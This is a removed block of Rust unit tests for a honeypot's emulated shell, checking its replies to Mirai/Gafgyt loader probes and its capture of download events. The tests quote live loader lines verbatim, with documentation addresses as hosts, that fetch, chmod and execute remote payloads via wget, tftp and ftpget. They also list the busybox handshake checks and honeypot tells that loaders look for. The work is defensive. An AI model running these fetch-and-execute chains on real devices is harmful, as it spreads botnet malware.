-            "cat: /tmp/payload: No such file or directory\n"
-        );
-        assert_eq!(
-            sh.handle_input("/tmp/payload").0,
-            "-bash: /tmp/payload: No such file or directory\n",
-            "a removed file stops being executable"
-        );
-        assert_eq!(
-            sh.handle_input("rm /tmp/payload").0,
-            "rm: cannot remove '/tmp/payload': No such file or directory\n"
-        );
-        assert_eq!(sh.handle_input("rm -f /tmp/payload").0, "");
-        assert_eq!(
-            sh.handle_input("rm /tmp/stage").0,
-            "rm: cannot remove '/tmp/stage': Is a directory\n"
-        );
-        assert_eq!(sh.handle_input("rm -rf /tmp/stage").0, "");
-        assert_eq!(
-            sh.handle_input("cd /tmp/stage").0,
-            "-bash: cd: /tmp/stage: No such file or directory\n"
-        );
-        // A baked-in file can be removed too: saying nothing and keeping it contradicts the rm.
-        assert_eq!(sh.handle_input("rm /etc/hostname").0, "");
-        assert_eq!(
-            sh.handle_input("cat /etc/hostname").0,
-            "cat: /etc/hostname: No such file or directory\n"
-        );
-    }
-
-    /// A fetch that saves to a file leaves that file behind, so the `chmod` and `./payload` a
-    /// loader runs next work; one that prints to stdout leaves nothing, as the real one does.
-    #[test]
-    fn a_saved_download_exists_afterwards_and_a_streamed_one_does_not() {
-        let mut sh = shell();
-        sh.handle_input("cd /tmp");
-        sh.handle_input("wget http://198.51.100.9/bins/x86");
-        assert_eq!(
-            sh.handle_input("ls /tmp").0,
-            "x86\n",
-            "saved under its name"
-        );
-        assert_eq!(
-            sh.handle_input("cat /tmp/x86").0,
-            super::FETCHED_BODY,
-            "the saved file holds the body the fetch claimed"
-        );
-        sh.handle_input("curl -o boot.sh http://198.51.100.9/boot");
-        assert_eq!(sh.handle_input("ls /tmp").0, "boot.sh  x86\n");
-        sh.handle_input("busybox tftp -g -r arm7 198.51.100.9");
-        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
-        // Streamed to stdout (the `| sh` pattern): nothing is written.
-        sh.handle_input("wget -qO- http://198.51.100.9/one");
-        sh.handle_input("curl http://198.51.100.9/two");
-        assert_eq!(sh.handle_input("ls /tmp").0, "arm7  boot.sh  x86\n");
-    }
-
-    /// Observed live (2026-09-06): `cat /proc/mounts; /bin/busybox URUMV`. The box answered
-    /// "No such file or directory" for a file every Linux has.
-    #[test]
-    fn proc_mounts_is_readable_and_agrees_with_the_mount_command() {
-        let mut sh = shell();
-        let (out, _) = sh.handle_input("cat /proc/mounts; /bin/busybox URUMV");
-        assert!(
-            out.contains("/dev/sda1 / ext4 rw,relatime,discard,errors=remount-ro 0 0\n"),
-            "{out}"
-        );
-        assert!(out.ends_with("URUMV: applet not found\n"), "{out}");
-        let (mount, _) = sh.handle_input("mount");
-        assert!(
-            mount.contains("/dev/sda1 on / type ext4 (rw,relatime,discard,errors=remount-ro)\n"),
-            "{mount}"
-        );
-        assert_eq!(
-            mount.lines().count(),
-            out.lines().count() - 1,
-            "mount lists exactly the table /proc/mounts exposes"
-        );
-        assert_eq!(
-            sh.handle_input("cat /etc/mtab").0,
-            sh.handle_input("cat /proc/self/mounts").0
-        );
-        assert_eq!(
-            sh.handle_input("cd /sys/fs/cgroup").0,
-            "",
-            "a listed mount point is a directory"
-        );
-        assert_eq!(sh.handle_input("mount -t tmpfs tmpfs /mnt").0, "");
-    }
-
-    #[test]
-    fn xor_obfuscated_command_is_decoded_dispatched_and_annotated() {
-        let mut sh = shell();
-        // The first obfuscated anchor ("enable" ^ 0x09) locks the session key.
-        sh.handle_input(xor("enable", 0x09));
-        // The obfuscated busybox probe now decodes and reaches the grammar.
-        let probe_obf = xor("/bin/busybox LZRD", 0x09);
-        let (out, events) = sh.handle_input(&probe_obf);
-        assert!(
-            out.contains("LZRD: applet not found"),
-            "decoded probe must get the busybox applet reply, got {out:?}"
-        );
-        assert_eq!(events[0].metadata["command"], probe_obf); // raw bytes preserved verbatim
-        assert_eq!(events[0].metadata["command_decoded"], "/bin/busybox LZRD");
-        assert_eq!(events[0].metadata["xor_key"], 9);
-    }
-
-    #[test]
-    fn plaintext_command_has_no_decoded_annotation() {
-        let (_out, events) = shell().handle_input("uname -a");
-        assert_eq!(events[0].metadata["command"], "uname -a");
-        assert!(events[0].metadata.get("command_decoded").is_none());
-        assert!(events[0].metadata.get("xor_key").is_none());
-    }
-
-    #[test]
-    fn binary_flood_emits_one_marker_event_not_one_per_line() {
-        // A channel streaming binary (an SSH IP produced >20k such "command" events) must not add
-        // one ledger event per garbage line.
-        let mut sh = shell();
-        let garbage = "\u{FFFD}".repeat(40);
-
-        let (_out, first) = sh.handle_input(&garbage);
-        assert_eq!(
-            first.len(),
-            1,
-            "the first binary line emits a single marker"
-        );
-        assert_eq!(first[0].metadata["flood"], "binary");
-
-        let mut more = 0;
-        for _ in 0..100 {
-            more += sh.handle_input(&garbage).1.len();
-        }
-        assert_eq!(more, 0, "subsequent binary lines emit no further events");
-    }
-
-    #[test]
-    fn command_flood_is_capped_to_one_marker_past_the_per_session_limit() {
-        let cap = super::MAX_COMMANDS_PER_SESSION;
-        let mut sh = shell();
-        let mut total = 0;
-        for i in 0..(cap + 50) {
-            total += sh.handle_input(format!("cmd{i}")).1.len();
-        }
-        // `cap` real command events + exactly one cap marker; never one per line.
-        assert_eq!(total, cap as usize + 1);
-    }
-
-    #[test]
-    fn a_normal_fetch_command_still_emits_its_command_and_download_events() {
-        let (_out, events) = shell().handle_input("wget http://198.51.100.9/x");
-        assert_eq!(
-            events.len(),
-            2,
-            "a fetch emits the command event + the download event"
-        );
-        assert!(events.iter().any(|e| e.metadata.get("url").is_some()));
-    }
-
-    #[test]
-    fn encode_output_mirrors_after_a_command_locks_the_key() {
-        let mut sh = shell();
-        sh.handle_input(xor("enable", 0x09)); // an obfuscated command locks 0x09
-        assert_eq!(sh.encode_output(b"# "), xor("# ", 0x09).into_bytes());
-        // A plaintext session leaves output unchanged.
-        let mut plain = shell();
-        plain.handle_input("uname");
-        assert_eq!(plain.encode_output(b"# "), b"# ".to_vec());
-    }
-
-    #[test]
-    fn bin_busybox_path_form_gets_the_applet_reply() {
-        // The full-path probe the LZRD variant sends must resolve like a bare `busybox` invocation.
-        let (out, _) = shell().handle_input("/bin/busybox LZRD");
-        assert!(out.contains("LZRD: applet not found"), "got {out:?}");
-    }
-
-    #[test]
-    fn cat_proc_self_cmdline_returns_the_reading_process_argv() {
-        // Every real Linux has /proc/self/cmdline; a "No such file or directory" is a honeypot tell
-        // some Mirai/Gafgyt loaders check before delivering a payload. /proc/self is the `cat`
-        // process, so it returns cat's own argv, NUL-separated with a trailing NUL and no newline.
-        let (out, _) = shell().handle_input("cat /proc/self/cmdline");
-        assert_eq!(out, "cat\0/proc/self/cmdline\0");
-    }
-
-    #[test]
-    fn cd_proc_then_cat_relative_cmdline_resolves_against_cwd() {
-        // The observed bot ran `cd /proc && cat self/cmdline`; the relative path must resolve.
-        let mut sh = shell();
-        sh.handle_input("cd /proc");
-        let (out, _) = sh.handle_input("cat self/cmdline");
-        assert_eq!(out, "cat\0self/cmdline\0");
-    }
-
-    #[test]
-    fn cat_relative_file_resolves_against_cwd() {
-        let mut sh = shell();
-        sh.handle_input("cd /etc");
-        let (out, _) = sh.handle_input("cat hostname");
-        assert!(out.contains("server01"), "got: {out:?}");
-    }
-
-    #[test]
-    fn sh_is_never_command_not_found() {
-        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
-        let (out, events) = shell().handle_input("sh");
-        assert_eq!(out, "");
-        assert_eq!(events.len(), 1); // command_exec only, no spurious download
-    }
-
-    /// Observed live 2026-09-06: a Mirai scanner sent `ls /home; /bin/busybox BOTNET` as ONE line.
-    /// The shell dispatched the whole line as `ls` with `/home;` as its argument, answered
-    /// "cannot access '/home;'", and the busybox probe never ran - so the loader never saw the
-    /// "applet not found" reply it gates its download stage on, and left. A real shell runs each
-    /// command in turn.
-    #[test]
-    fn semicolon_separated_commands_each_run_and_the_busybox_gate_still_answers() {
-        let (out, events) = shell().handle_input("ls /home; /bin/busybox BOTNET");
-        assert!(
-            out.contains("ubuntu"),
-            "ls /home must list the home dir: {out:?}"
-        );
-        assert!(
-            out.ends_with("BOTNET: applet not found\n"),
-            "the busybox probe after the `;` must run and answer: {out:?}"
-        );
-        assert!(!out.contains("cannot access"), "{out:?}");
-        assert_eq!(
-            events.len(),
-            1,
-            "still one command_exec event per input line"
-        );
-    }
-
-    #[test]
-    fn cd_then_pwd_on_one_line_sees_the_new_directory() {
-        let (out, _) = shell().handle_input("cd /tmp; pwd");
-        assert_eq!(out, "/tmp\n");
-    }
-
-    #[test]
-    fn and_and_or_short_circuit_on_the_previous_outcome() {
-        let (out, _) = shell().handle_input("nosuchcmd && echo ran");
-        assert!(
-            !out.contains("ran"),
-            "&& after a failure must not run: {out:?}"
-        );
-        let (out, _) = shell().handle_input("nosuchcmd || echo fallback");
-        assert!(
-            out.ends_with("fallback\n"),
-            "|| after a failure must run: {out:?}"
-        );
-        let (out, _) = shell().handle_input("id && echo ok");
-        assert!(out.contains("uid=0") && out.ends_with("ok\n"), "{out:?}");
-    }
-
-    #[test]
-    fn explicit_status_controls_lists_without_reading_output_words() {
-        let (out, _) = shell().handle_input("echo not found && echo continued");
-        assert_eq!(out, "not found\ncontinued\n");
-        assert_eq!(out.status, 0);
-
-        let (out, _) = shell().handle_input("false && echo skipped || echo fallback");
-        assert_eq!(out, "fallback\n");
-        assert_eq!(out.status, 0);
-
-        let (out, _) = shell().handle_input("true || echo skipped");
-        assert_eq!(out, "");
-        assert_eq!(out.status, 0);
-    }
-
-    #[test]
-    fn command_result_keeps_ordered_stdout_and_stderr_segments() {
-        let (out, _) = shell().handle_input("nosuchcmd; echo recovered");
-        assert_eq!(out.status, 0, "the final command decides the list status");
-        assert_eq!(out.bytes(), b"nosuchcmd: command not found\nrecovered\n");
-        assert_eq!(out.output.len(), 2);
-        assert_eq!(out.output[0].fd, OutputFd::Stderr);
-        assert_eq!(out.output[1].fd, OutputFd::Stdout);
-
-        let (failed, _) = shell().handle_input("nosuchcmd");
-        assert_eq!(failed.status, 127);
-        assert_eq!(failed.output[0].fd, OutputFd::Stderr);
-    }
-
-    #[test]
-    fn modeled_failures_carry_their_real_exit_statuses() {
-        let mut sh = shell();
-        let cases = [
-            ("/bin/busybox ECCHI", 127),
-            ("false", 1),
-            ("nosuchcmd_q", 127),
-            ("/tmp", 126),
-            ("/tmp/missing_q", 127),
-            ("cat /missing_q", 1),
-            ("ls /missing_q", 2),
-            ("cd /missing_q", 1),
-            ("cp", 1),
-            ("rm", 1),
-            ("mkdir", 1),
-            ("> /missing_q/x", 1),
-        ];
-        for (line, expected) in cases {
-            let (out, _) = sh.handle_input(line);
-            assert_eq!(out.status, expected, "{line}: {out:?}");
-            if !out.is_empty() {
-                assert_eq!(out.output[0].fd, OutputFd::Stderr, "{line}: {out:?}");
-            }
-        }
-
-        assert_eq!(sh.handle_input(">/tmp/np").0.status, 0);
-        assert_eq!(sh.handle_input("/tmp/np").0.status, 126);
-        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 0);
-        assert_eq!(sh.handle_input("mkdir /tmp/existing").0.status, 1);
-    }
-
-    #[test]
-    fn onlcr_maps_newlines_without_decoding_bytes() {
-        assert_eq!(onlcr(b"a\n\0\xffb\n"), b"a\r\n\0\xffb\r\n");
-        assert_eq!(onlcr(b"\r\n"), b"\r\r\n");
-    }
-
-    #[test]
-    fn a_pipeline_stays_one_command_answered_by_its_first_stage() {
-        // `|` is not a control operator here: the left stage answers, as before this change.
-        let (out, _) = shell().handle_input("id | grep uid");
-        assert!(out.contains("uid=0(root)"), "{out:?}");
-        assert!(!out.contains("grep"), "{out:?}");
-    }
-
-    /// Observed live 2026-09-06, verbatim: a loader probing for a writable directory before
-    /// choosing a drop location, then printing the marker it keys its next stage on.
-    #[test]
-    fn writable_directory_probe_chain_reaches_the_busybox_marker() {
-        let mut sh = shell();
-        let (out, events) = sh.handle_input(
-            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
-             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
-             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
-        );
-        assert_eq!(
-            out, "QJLXTK\n",
-            "every probe silent, then exactly the marker"
-        );
-        assert_eq!(sh.cwd, "/var", "the last successful `&& cd` wins");
-        assert_eq!(events.len(), 1, "one command_exec for the line");
-        assert_eq!(
-            events[0].signal_type,
-            sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC,
-            "no download event: the line retrieves nothing"
-        );
-    }
-
-    #[test]
-    fn a_redirection_probe_into_a_missing_directory_fails_and_blocks_its_cd() {
-        let mut sh = shell();
-        let (out, _) = sh.handle_input(">/nonexistent/.x&&cd /nonexistent;pwd");
-        assert_eq!(
-            out, "-bash: /nonexistent/.x: No such file or directory\n/root\n",
-            "{out:?}"
-        );
-        assert_eq!(sh.cwd, "/root");
-    }
-
-    #[test]
-    fn a_created_file_shows_up_in_a_later_listing() {
-        let mut sh = shell();
-        sh.handle_input("cd /tmp; >.x");
-        let (out, _) = sh.handle_input("ls -a /tmp");
-        assert!(out.contains(".x"), "{out:?}");
-    }
-
-    #[test]
-    fn cd_into_a_directory_the_box_does_not_present_is_refused() {
-        let mut sh = shell();
-        let (out, _) = sh.handle_input("cd /nonexistent");
-        assert_eq!(out, "-bash: cd: /nonexistent: No such file or directory\n");
-        assert_eq!(sh.cwd, "/root");
-        // Directories the root listing advertises, and ancestors of modeled files, still work.
-        assert_eq!(sh.handle_input("cd /proc").0, "");
-        assert_eq!(sh.handle_input("cd /bin").0, "");
-    }
-
-    /// A file made executable under a `noexec` mount is refused as the kernel refuses it, while
-    /// the same steps in an exec-permitted directory run. `/var/run` is `/run` behind a symlink,
-    /// so it is refused too.
-    #[test]
-    fn running_a_chmodded_file_from_a_noexec_mount_is_permission_denied() {
-        let mut sh = shell();
-        sh.handle_input(">/run/x; chmod +x /run/x");
-        let (out, _) = sh.handle_input("/run/x");
-        assert_eq!(out, "-bash: /run/x: Permission denied\n");
-        assert_eq!(out.status, 126);
-        assert_eq!(
-            sh.handle_input("/var/run/x").0,
-            "-bash: /var/run/x: Permission denied\n"
-        );
-        sh.handle_input(">/tmp/x; chmod +x /tmp/x");
-        assert_eq!(sh.handle_input("/tmp/x").0, "", "/tmp permits exec");
-
-        let mut android = FakeShell::android(
-            FakeFs::android(),
-            EmitContext {
-                source_ip: "203.0.113.7".parse().unwrap(),
-                wan_ip: None,
-                authenticated: true,
-                protocol_label: "adb".to_string(),
-                session_id: None,
-            },
-        );
-        android.handle_input(">/sdcard/x; chmod +x /sdcard/x");
-        let (out, _) = android.handle_input("/sdcard/x");
-        assert_eq!(out, "sh: /sdcard/x: Permission denied\n");
-        assert_eq!(out.status, 126);
-        android.handle_input(">/data/local/tmp/x; chmod +x /data/local/tmp/x");
-        assert_eq!(android.handle_input("/data/local/tmp/x").0, "");
-    }
-
-    /// `cat` of a directory says so; it used to claim the directory did not exist.
-    #[test]
-    fn cat_of_a_directory_says_it_is_a_directory() {
-        let mut sh = shell();
-        let (out, _) = sh.handle_input("cat /etc");
-        assert_eq!(out, "cat: /etc: Is a directory\n");
-        assert_eq!(out.status, 1);
-        assert_eq!(
-            sh.handle_input("cat /nonexistent").0,
-            "cat: /nonexistent: No such file or directory\n"
-        );
-        assert_eq!(
-            sh.handle_input("cat /bin").0,
-            "cat: /bin: Is a directory\n",
-            "a symlink to a directory is a directory"
-        );
-    }
-
-    /// `cd` through a symlink keeps the logical path in `pwd` and the prompt, as bash does, while
-    /// files resolve physically.
-    #[test]
-    fn cd_through_a_symlink_keeps_the_logical_cwd() {
-        let mut sh = shell();
-        assert_eq!(sh.handle_input("cd /var/run").0, "");
-        assert_eq!(sh.handle_input("pwd").0, "/var/run\n");
-        assert_eq!(sh.handle_input(">.x").0, "");
-        assert_eq!(sh.handle_input("ls -a /run").0, ".x  lock  user\n");
-        assert_eq!(sh.handle_input("cd /bin").0, "");
-        assert_eq!(sh.handle_input("pwd").0, "/bin\n");
-        assert_eq!(
-            sh.handle_input("cat busybox").0.bytes(),
-            b"\x7fELF\x02\x01\x01\0"
-        );
-    }
-
-    #[test]
-    fn su_on_a_root_shell_is_silent() {
-        assert_eq!(shell().handle_input("su").0, "");
-        assert_eq!(shell().handle_input("su -").0, "");
-        assert_eq!(shell().handle_input("su root").0, "");
-    }
-
-    #[test]
-    fn background_ampersand_and_newline_also_separate_commands() {
-        let (out, _) = shell().handle_input("cd /etc & pwd\nwhoami");
-        assert!(out.ends_with("/etc\nroot\n"), "{out:?}");
-    }
-
-    #[test]
-    fn mirai_busybox_probe_returns_applet_not_found() {
-        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
-        // "<TOKEN>: applet not found" reply before delivering a payload.
-        let (out, _) = shell().handle_input("busybox MIRAI");
-        assert_eq!(out, "MIRAI: applet not found\n");
-    }
-
-    #[test]
-    fn busybox_echo_still_passes_the_gafgyt_handshake() {
-        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
-        assert_eq!(out, "GAYFGT\n");
-    }
-
-    #[test]
-    fn sh_dash_c_runs_the_inner_command() {
-        let (out, _) = shell().handle_input("sh -c \"id\"");
-        assert!(out.contains("uid=0(root)"), "got: {out}");
-    }
-
-    #[test]
-    fn busybox_wget_is_captured_as_a_download() {
-        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
-        let dl = events
-            .iter()
-            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-            .expect("busybox wget must emit a file_download event");
-        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
-    }
-
-    #[test]
-    fn download_target_recognizes_direct_and_busybox_forms() {
-        assert_eq!(
-            download_target(&["wget", "http://x/y"]).as_deref(),
-            Some("http://x/y")
-        );
-        // Previously asserted `Some("x")` - the FILENAME - which was the defect: a scheme-less
-        // fragment the fetcher cannot parse. The host and file are separate tokens; the url is
-        // synthesized from both.
-        assert_eq!(
-            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]).as_deref(),
-            Some("tftp://10.0.0.1/x")
-        );
-        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
-        assert_eq!(download_target(&["ls", "-la"]), None);
-    }
-
-    #[test]
-    fn download_target_captures_full_path_fetch_forms() {
-        // Loaders routinely invoke fetchers by absolute path; `download_target` must resolve the
-        // basename like `dispatch` does, or the `honeypot_file_download` evidence is silently lost
-        // for these while the shell still answers them in-persona. Scheme-less tftp is the case the
-        // `url_if_fetch_line` URL-scheme fallback cannot rescue.
-        assert_eq!(
-            download_target(&[
-                "/bin/busybox",
-                "tftp",
-                "-g",
-                "-r",
-                "payload.arm",
-                "198.51.100.9"
-            ])
-            .as_deref(),
-            Some("tftp://198.51.100.9/payload.arm")
-        );
-        assert_eq!(
-            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]).as_deref(),
-            Some("http://198.51.100.9/x")
-        );
-        // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
-        // "applet not found" to the persona, so it must not be recorded as a fetch.
-        assert_eq!(
-            download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
-            None
-        );
-    }
-
-    // The exact retrieval lines a live Mirai loader ran against the telnet sensor (documentation
-    // address in place of the real payload host). Both had been recorded as the bare host with no
-    // scheme, so the fetcher never queued either.
-    #[test]
-    fn download_target_synthesizes_urls_for_bare_tftp_and_ftpget() {
-        // `-g HOST -r FILE`: host before the -r operand.
-        assert_eq!(
-            download_target(&["tftp", "-g", "198.51.100.9", "-r", "tftp"]).as_deref(),
-            Some("tftp://198.51.100.9/tftp")
-        );
-        // `ftpget HOST LOCAL REMOTE`: the remote name is the last positional.
-        assert_eq!(
-            download_target(&["ftpget", "198.51.100.9", "f", "ftpget"]).as_deref(),
-            Some("ftp://198.51.100.9/ftpget")
-        );
-        // `ftpget HOST REMOTE` (local name defaulted).
-        assert_eq!(
-            download_target(&["ftpget", "198.51.100.9", "bin.arm"]).as_deref(),
-            Some("ftp://198.51.100.9/bin.arm")
-        );
-        // Explicit ports, both syntaxes.
-        assert_eq!(
-            download_target(&["tftp", "-g", "-r", "x", "198.51.100.9", "6969"]).as_deref(),
-            Some("tftp://198.51.100.9:6969/x")
-        );
-        assert_eq!(
-            download_target(&["ftpget", "-P", "2121", "198.51.100.9", "x"]).as_deref(),
-            Some("ftp://198.51.100.9:2121/x")
-        );
-        // `-l` alone names the remote file too (BusyBox behaviour); `-u`/`-p` operands are skipped,
-        // never mistaken for the host.
-        assert_eq!(
-            download_target(&["tftp", "-g", "-l", "local.bin", "198.51.100.9"]).as_deref(),
-            Some("tftp://198.51.100.9/local.bin")
-        );
-        assert_eq!(
-            download_target(&["ftpget", "-u", "anon", "-p", "x", "198.51.100.9", "f"]).as_deref(),
-            Some("ftp://198.51.100.9/f")
-        );
-        // A host with no file is still evidence; no host at all is not a fetch.
-        assert_eq!(
-            download_target(&["tftp", "-g", "198.51.100.9"]).as_deref(),
-            Some("tftp://198.51.100.9")
-        );
-        assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
-    }
-
-    /// A loader line seen live 2026-09-03 (host replaced): the output file is named BEFORE the
-    /// url, and the whole thing is a `cd` chain with the fetchers in a subshell. It was recorded
-    /// as a download of `1.sh`, a bare filename the fetcher could not retrieve.
-    #[test]
-    fn output_file_named_before_the_url_is_not_mistaken_for_the_url() {
-        let line = "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.51.100.9:80/1.sh||busybox wget -q -O 1.sh http://198.51.100.9:80/1.sh||curl -so 1.sh http://198.51.100.9:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok";
-        let (_out, events) = shell().handle_input(line);
-        let urls: Vec<_> = events
-            .iter()
-            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
-            .collect();
-        assert_eq!(urls, vec!["http://198.51.100.9:80/1.sh"]);
-
-        // Schemeless forms still resolve by position, with option values skipped either way.
-        assert_eq!(
-            download_target(&["wget", "-q", "-O", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
-            Some("198.51.100.9/1.sh")
-        );
-        assert_eq!(
-            download_target(&["wget", "-qO", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
-            Some("198.51.100.9/1.sh"),
-            "a cluster ending in a value-taking letter consumes the next token"
-        );
-        assert_eq!(
-            download_target(&["wget", "-qO-", "198.51.100.9/1.sh"]).as_deref(),
-            Some("198.51.100.9/1.sh"),
-            "an attached value (`-qO-`) must not consume the url"
-        );
-        assert_eq!(
-            download_target(&["curl", "-so", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
-            Some("198.51.100.9/1.sh")
-        );
-        assert_eq!(
-            download_target(&["curl", "--output", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
-            Some("198.51.100.9/1.sh")
-        );
-    }
-
-    /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
-    /// Each fetcher is wrapped in a `( a || busybox a ) > f; ...` fallback chain, so the fetch verb
-    /// is never the line's first token. The wget line was captured on the box; tftp and ftpget
-    /// were not, because their URLs have no scheme for the raw-line scan to find.
-    #[test]
-    fn mirai_fallback_chains_emit_a_download_event_for_every_fetcher() {
-        let cases = [
-            (
-                "(wget http://198.51.100.9/wget -O- || busybox wget http://198.51.100.9/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-                "http://198.51.100.9/wget",
-            ),
-            (
-                "(tftp -g 198.51.100.9 -r tftp -l- || busybox tftp -g 198.51.100.9 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-                "tftp://198.51.100.9/tftp",
-            ),
-            (
-                "(ftpget 198.51.100.9 f ftpget || busybox ftpget 198.51.100.9 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-                "ftp://198.51.100.9/ftpget",
-            ),
-        ];
-        for (line, url) in cases {
-            let (_out, events) = shell().handle_input(line);
-            let dls: Vec<_> = events
-                .iter()
-                .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-                .collect();
-            assert_eq!(dls.len(), 1, "exactly one download event for: {line}");
-            assert_eq!(dls[0].metadata["url"], url, "line: {line}");
-        }
-    }
-
-    #[test]
-    fn simple_commands_split_at_separators_and_stop_at_redirections() {
-        assert_eq!(
-            simple_commands(
-                "(tftp -g h -r x -l- || busybox tftp -g h) > t; chmod 777 t && ./t 2>&1"
-            ),
-            vec![
-                vec!["tftp", "-g", "h", "-r", "x", "-l-"],
-                vec!["busybox", "tftp", "-g", "h"],
-                vec!["chmod", "777", "t"],
-                vec!["./t"],
-            ]
-        );
-        // A `&` inside a query string is part of the URL, not a background operator.
-        assert_eq!(
-            simple_commands("wget http://h/x?a=1&b=2 -O- & sleep 1"),
-            vec![
-                vec!["wget", "http://h/x?a=1&b=2", "-O-"],
-                vec!["sleep", "1"]
-            ]
-        );
-    }
-
-    #[test]
-    fn a_line_fetching_two_different_urls_emits_two_download_events() {
-        let (_out, events) = shell().handle_input(
-            "wget http://198.51.100.9/a; tftp -g 198.51.100.9 -r b; wget http://198.51.100.9/a",
-        );
-        let urls: Vec<_> = events
-            .iter()
-            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
-            .collect();
-        assert_eq!(
-            urls,
-            vec!["http://198.51.100.9/a", "tftp://198.51.100.9/b"],
-            "one event per distinct URL, in first-seen order"
-        );
-    }
-
-    #[test]
-    fn a_bare_tftp_line_emits_a_download_event_with_a_real_url() {
-        let (_out, events) = shell().handle_input("tftp -g 198.51.100.9 -r tftp");
-        let dl = events
-            .iter()
-            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-            .expect("a bare tftp fetch must emit a download event");
-        assert_eq!(dl.metadata["url"], "tftp://198.51.100.9/tftp");
-    }
-
-    #[test]
-    fn busybox_applet_set() {
-        assert!(is_busybox_applet("wget"));
-        assert!(is_busybox_applet("sh"));
-        assert!(!is_busybox_applet("MIRAI"));
-    }
-
-    fn noon() -> chrono::DateTime<chrono::Utc> {
-        "2026-09-29T12:00:00Z".parse().unwrap()
-    }
-
-    #[test]
-    fn the_session_clock_stamps_replies_and_events() {
-        let mut sh = shell().with_clock(noon);
-        let (out, events) = sh.handle_input("wget http://198.51.100.9/x");
-        assert!(
-            out.starts_with("--2026-09-29 12:00:00--  http://198.51.100.9/x\n"),
-            "{out}"
-        );
-        assert!(
-            out.contains("\n2026-09-29 12:00:00 (1.2 MB/s) - 'x' saved"),
-            "{out}"
-        );
-        assert_eq!(events.len(), 2, "{events:?}");
-        assert!(events.iter().all(|e| e.observed_at == noon()));
-    }
-
-    #[test]
-    fn wget_derives_the_saved_filename_from_the_url() {
-        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"], noon());
-        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
-        assert!(
-            !out.contains("index.html"),
-            "constant filename tell remains: {out}"
-        );
-    }
-
-    #[test]
-    fn wget_quiet_suppresses_the_banner() {
-        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"], noon()), "");
-    }
-
-    #[test]
-    fn wget_dash_big_o_dash_writes_body_to_stdout() {
-        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
-        let out = cmd_wget(&["wget", "-qO-", "http://x/y"], noon());
-        assert!(out.contains("It works!"), "got: {out}");
-    }
-
-    #[test]
-    fn curl_dash_big_o_is_silent_on_stdout() {
-        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
-        // body, a clean one-probe tell.
-        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
-        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
-        // Without -o/-O, curl prints the body to stdout.
-        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
-    }
-
-    #[test]
-    fn ping_is_not_command_not_found() {
-        let (out, _) = shell().handle_input("ping 8.8.8.8");
-        assert!(out.contains("ping statistics"), "got: {out}");
-        assert!(!out.contains("command not found"), "got: {out}");
-    }
-
-    #[test]
-    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
-        let (_, events) =
-            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
-        let dl = events
-            .iter()
-            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
-            .expect("a wget URL inside sh -c must still be captured");
-        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
-    }
-
-    #[test]
-    fn url_scan_only_fires_with_a_fetch_verb() {
-        assert_eq!(
-            url_if_fetch_line("wget http://a/b"),
-            Some("http://a/b"),
-            "fetch verb + url should capture"
-        );
-        assert_eq!(
-            url_if_fetch_line("echo http://a/b"),
-            None,
-            "a bare echo of a url is not a download"
-        );
-    }
-
-    #[test]
-    fn uname_m_returns_only_the_machine_field() {
-        // The #1 IoT-loader recon command: `uname -m` must print exactly the arch, not the whole
-        // `uname -a` line (the old shortcut returned uname_all for any flag - a one-probe tell that
-        // also broke arch-based payload selection).
-        assert_eq!(
-            cmd_uname(&["uname", "-m"], crate::shell::ShellFlavor::Bash),
-            "x86_64\n"
-        );
-        assert_eq!(
-            cmd_uname(&["uname", "-p"], crate::shell::ShellFlavor::Bash),
-            "x86_64\n"
-        );
-    }
-
-    #[test]
